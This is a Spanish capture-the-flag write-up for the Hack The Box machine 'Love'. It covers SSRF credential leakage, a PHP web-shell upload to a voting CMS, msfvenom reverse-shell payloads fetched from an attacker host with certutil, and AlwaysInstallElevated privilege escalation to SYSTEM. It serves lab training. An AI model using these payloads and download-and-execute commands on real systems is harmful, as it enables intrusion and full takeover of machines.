# Love

<p align="center">
  <img src="https://www.hackthebox.com/storage/avatars/c00774d8d806b82c709c596937a92d14.png">
</p>

<div align="center">
  <table>
    <tr>
      <th>Plataforma</th>
      <th>Nombre</th>
      <th>OS</th>
      <th>IP</th>
      <th>Fecha de la máquina retirada</th>
      <th>Dificultad</th>
      <th>Certificaciones</th>
      <th>Status</th>
    </tr>
    <tr>
      <td align="center">Hack The Box</td>
      <td align="center">Love</td>
      <td align="center">Windows</td>
      <td align="center">10.10.10.239</td>
      <td align="center">01 de Mayo 2021</td>
      <td align="center">:green_circle: Fácil</td>
      <td>
        <ul>
          <li>eJPT</li>
	  <li>eWPT</li>
        </ul>
      </td>
      <td align="center">:heavy_check_mark:</td>
    </tr>
  </table>
</div>

> -------------------------

## Etapas

- [Etapa de Reconocimiento](#etapa-de-reconocimiento)
- [Etapa de Enumeración](#etapa-de-enumeración)
- [Etapa de Explotación](#etapa-de-explotación)
- [Etapa de Escalada de Privilegios](#etapa-de-escalada-de-privilegios)

> -------------------------

## Técnicas Exploradas

- Server Side Request Forgery (SSRF)
- Exploitacion de CMS - Voting System
- Abusar de AlwaysInstallElevated (msiexec/msi file)
 
> -------------------------

## Etapa de Reconocimiento

<p align="justify">
  Para empezar, iniciamos un escaneo agresivo para la enumeración de puerto abierto y descubrimos la siguiente información de puertos, lo cual no es recomendable, se debe aplicar escaneos sigiloso.
</p>

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG allPorts
nmap -sCV -p<PORTS> <IP> -oN targeted - Formato NMAP
nmap -sCV -p<PORTS> <IP> -oX targeted - Formato XML
	xsltproc targetedXML > /var/www/html/index.html
```

|Item|Descripción|
|---|---|
|-p-|Un atajo que le dice a Nmap que escanee todos los puertos|
|-vvv|Brinda una salida muy detallada para que pueda ver los resultados a medida que se encuentran, y también incluye información que normalmente no se muestra|
|-sC|Equivale --script=default ejecuta una colección de scripts de enumeración Nmap contra el objetivo|
|-sV|¿Escanea una versión de servicio?|
|-oA|Guarda los tres formatos (estándar, greppable y XML) de salida con un nombre de archivo de $name|

```java
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-10-23T04:27:40+00:00; +21m13s from scanner time.
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m13s, deviation: 3h30m01s, median: 21m12s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-22T21:27:25-07:00
| smb2-time: 
|   date: 2023-10-23T04:27:27
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

> -------------------------

## Etapa de Enumeración

> **SERVICIO HTTP - PORT 80**

<p align="justify">
  En el escaneo de puertos, notamos una cantidad significativa de puertos abiertos. Al analizar los puertos abiertos específicos utilizando Nmap, destacamos la presencia de varios servicios web, incluyendo los puertos 80 y 443. En el puerto 443, Nmap nos devuelve el nombre de dominio, que es staging.love.htb, lo agregagos al archivo hosts.
</p>

```go
openssl s_client -connect 10.10.10.239:443
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/e1ee451f-bce0-42ed-9588-cc551454c507">
</p>

```go
vi /etc/hosts
---------------------------------------
# Virtual Hosting
10.10.10.239  staging.love.htb love.htb
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/e19e4f85-7847-44b3-86b3-3d4c19b421c8">
</p>

<p align="justify">
  Hasta este punto, hemos identificado dos servicios web distintos a los que podemos acceder. Uno de ellos parece ser un sistema de votación implementado en PHP, mientras que el otro parece ser un escáner de archivos.
</p>

```go
whatweb http://10.10.10.239/
whatweb -a3 -v http://10.10.10.239/
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/0d63e12c-90f9-48ef-8bd6-2abbf3380d84">
</p>

<p align="justify">
  Nos dirigiremos al sitio web en la dirección 10.10.10.239 (love.htb) y realizaremos una búsqueda de rutas utilizando el script de NMAP.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/3dd99757-9baf-4942-9985-b721d1072b02">
</p>

```go
nmap --script http-enum -p80 love.htb
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/55dba545-850d-42ef-b2e0-398dfea16f9b">
</p>

>**ENUMERACIÓN DE SUBDOMINIO**

<p align="justify">
  Con respecto al sitio web staging.love.htb, notamos que en el menú "Demo" existe una característica interesante que permite analizar archivos ubicados en direcciones web.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/5becefc6-3538-4e09-94b4-fd1f1e853027">
</p>

<p align="justify">
  Se presenta una vulnerabilidad de aplicación web conocida como "falsificación de solicitudes del lado del servidor" (SSRF). En resumen, la SSRF explota la confianza otorgada a la propia máquina. Dado que la solicitud de recursos se origina en la propia máquina, esto puede permitir el acceso a archivos que normalmente estarían restringidos. Para ilustrar esto, ingresé la dirección de bucle de retorno 127.0.0.1 seguida del puerto 5000 en la barra de direcciones. Esto me dio acceso a la página a la que previamente no podía acceder. Al enviar la solicitud, obtuve las credenciales.
</p>

```go
http://staging.love.htb/
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/093d1d07-291c-4faa-94f6-223124632d97">
</p>

```go
Credenciales:
	User> admin
	Pass> @LoveIsInTheAir!!!! 
```

> -------------------------

## Etapa de Explotación

<p align="justify">
  Este puerto nos proporciona credenciales que podemos utilizar para acceder al panel de administración de la web de votación. Si ingresamos estas credenciales en la página de inicio de sesión de administrador (love.htb/admin), obtendremos acceso al sistema de votación.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/dc826445-9928-42d6-989d-f3d1eeb792e0">
</p>

> **File Upload + RCE - CMS**

<p align="justify">
  Dentro de las funcionalidades ofrecidas por esta página web, se incluye la posibilidad de cargar un archivo al editar la foto de perfil. Esta opción podría representar un método potencial para cargar una reverse shell.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/18884281-b776-4b5c-b3da-535e470d46e5">
</p>

<p align="justify">
  Ahora, podemos cargar un backdoor en PHP para tomar el control de los comandos que se pueden ejecutar. Esto nos permitirá extraer información e incluso acceder a la máquina víctima.
</p>

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

<p align="center">
  <img src="hhttps://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/cd34c83e-613f-46c8-8815-345a70a62d2a">
</p>

<p align="justify">
  Subimos el archivo y confirmamos que nuestro backdoor fue aceptado. Ahora podemos buscar la ruta de las imágenes para verificar la ejecución remota de comandos.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/5058507d-d636-43d5-8278-54f051d9a947">
</p>

<p align="justify">
  En el código fuente nos muestra el archivo "cmd.php" se encuentra en http://love.htb/images/.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/fd926399-45b7-4b44-843b-e2b0cb5f0337">
</p>

<p align="justify">
  Es importante tener en cuenta que estamos realizando el ataque en un sistema Windows al introducir los comandos a ejecutar.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/fbca0281-b97d-4ad3-9a64-68cb07cf68d3">
</p>

```go
https://love.htb/images/cmd.php?cmd=ipconfig
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/8fbf796f-0498-469f-a341-27b66f88457d">
</p>

<p align="justify">
  Ahora disponemos de la capacidad de ejecutar comandos de forma remota, lo que nos permite crear un payload adecuado. Sin embargo, antes de proceder con la creación, es esencial conocer la arquitectura del sistema. Para lograr esto, empleamos el siguiente procedimiento:
</p>

```powershell
wmic os get osarchitecture
systeminfo
systeminfo | findstr /C:"System Type"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/e72ee644-4304-4e8d-846f-04c8d2e246bf">
</p>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST='10.10.14.9' LPORT=443 -f exe -o reverse_shell.exe
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/dcb875de-6efd-4648-89d8-ce62af4b22c1">
</p>

<p align="justify">
  Procedemos a subir el payload creado en el campo que no se encuentra sanitizado.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/0d73241c-a5c3-4477-af5c-51e2f5948d35">
</p>

<p align="justify">
  Nos ubicamos en la ruta del servidor y encontramos que el binario se encuentra alojado.
</p>

```java
C:\xampp\htdocs\omrs\images
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/995473aa-073b-4ef6-977e-ced8c38af370">
</p>

```go
Ejecución del binario:
	https://love.htb/images/cmd.php?cmd=reverse_shell.exe
```
<p align="justify">
  Antes de ejecutar el binario, podemos configurar una escucha con Netcat y, además, complementarlo con RLWRAP para lograr una experiencia de shell interactiva más completa.
</p>

```go
rlwrap nc -nvlp 443
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/e35e1635-3ec2-497f-aa34-6c5a4f784de6">
</p>

<p align="justify">
  Ahora tenemos la capacidad de acceder al escritorio del usuario al que hemos obtenido acceso y obtener la primera contraseña.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/e528737e-cb9a-4cd3-8344-3bb12a4c4d0b">
</p>

> -------------------------

## Etapa de Escalada de Privilegios

<p align="justify">
  Después de examinar minuciosamente el sistema de archivos, opté por ejecutar WinPeas. Esta herramienta proporciona una mayor visibilidad sobre posibles rutas o archivos vulnerables, lo que facilita la identificación de oportunidades para escalar privilegios.
</p>

- [WinPEAS](https://github.com/carlospolop/PEASS-ng)

<p align="justify">
  Ahora realizamos la transferencia de archivo desde nuestra máquina nos montaremos un servidor HTTP para que desde la máquina con CERTUTIL.EXE podamos descargar el binario.
</p>

```go
Máquina Atacante:
	python3 -m http.server 80

Máquina Victima:
	certutil.exe -f -urlcache -split http://10.10.14.9/winPeas.exe winPeas.exe
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/e9a53b39-093c-4ae9-b849-e6e77b2e7851">
</p>

<p align="justify">
  Ejecutamos el binario de WinPeas.
</p>

```go
C:> C:\Windows\Temp\PrivEsc\winPeas.exe
```

<p align="justify">
  Descubrimos que el administrador había habilitado la función 'AlwaysInstallElevated' en el registro. Esta configuración nos brinda una oportunidad para obtener un shell del sistema.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/6633b93c-0920-459c-8362-3fb066555dff">
</p>

- [Windows Local Privilege - Always install elevated](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated)

<p align="justify">
  En un primer paso, creamos un archivo MSI con una carga útil de shell inversa mediante Msfvenom. 
</p>

```go
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -f msi -o sh4dowcost.msi
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/1c3de7f7-f24d-43b4-b0b1-21ef30cbffab">
</p>

<p align="justify">
  Alojamos este archivo y lo descargamos en la máquina de destino.
</p>

```go
python3 -m http.server 80
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/bc3904a0-128c-4b92-adbf-d315247a73e4">
</p>

```go
Descarga de archivo>
	certutil.exe -f -urlcache -split http://10.10.14.9/sh4dowcost.msi sh4dowcost_rs.msi
	powershell -command "Invoke-WebRequest -Uri 'http://10.10.14.9/sh4dowcost.msi' -OutFile sh4dowcost_rs.msi"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/984a4d7c-4184-494c-8fe7-7830da2d008c">
</p>

<p align="justify">
  Ahora he configurado un oyente de Netcat y procedí a ejecutar el archivo MSI.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/b27d4a53-9594-4f0c-b4b2-977935c82a42">
</p>

```go
C:> msiexec /quiet /qn /i C:\Windows\Temp\PrivEsc\sh4dowcost_rs.msi
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/56517279-14d3-4829-9528-93f1f0472581">
</p>

<p align="justify">
  Ahora tenemos acceso como usuario NT AUTHORITY\SYSTEM, lo que nos permite entrar en el directorio del 'Administrador' y obtener la flag de ROOT.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/71a898fd-3eb0-446c-bc41-2f85b025acf8">
</p>

>**LOVE - PWNED!**
